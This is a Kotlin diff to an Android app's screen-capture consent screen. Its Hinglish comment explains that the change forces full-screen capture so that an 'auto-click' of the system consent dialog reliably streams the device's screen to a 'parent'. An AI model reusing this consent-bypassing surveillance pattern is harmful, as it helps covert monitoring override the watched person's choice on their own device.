@@ -46,6 +46,21 @@ class ConsentActivity : ComponentActivity() {
         Store.lastConsentRequestAt = now
         Store.projectionRequestedAt = now
         val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
-        runCatching { projLauncher.launch(mgr.createScreenCaptureIntent()) }.onFailure { finish() }
+        runCatching {
+            // Android 14+ dialog me "A single app" dropdown default hota tha —
+            // uske saath Start dabane par sirf HUMARI app capture hoti thi aur
+            // parent ko kaali screen dikhti thi ("start karne pe bhi chal ni
+            // raha"). createConfigForDefaultDisplay() dropdown ko hata deta hai:
+            // dialog seedha POORE screen ki consent deta hai, auto-click hamesha
+            // sahi cheez capture karta hai.
+            val req = if (Build.VERSION.SDK_INT >= 34) {
+                mgr.createScreenCaptureIntent(
+                    android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()
+                )
+            } else {
+                mgr.createScreenCaptureIntent()
+            }
+            projLauncher.launch(req)
+        }.onFailure { finish() }
     }
 }
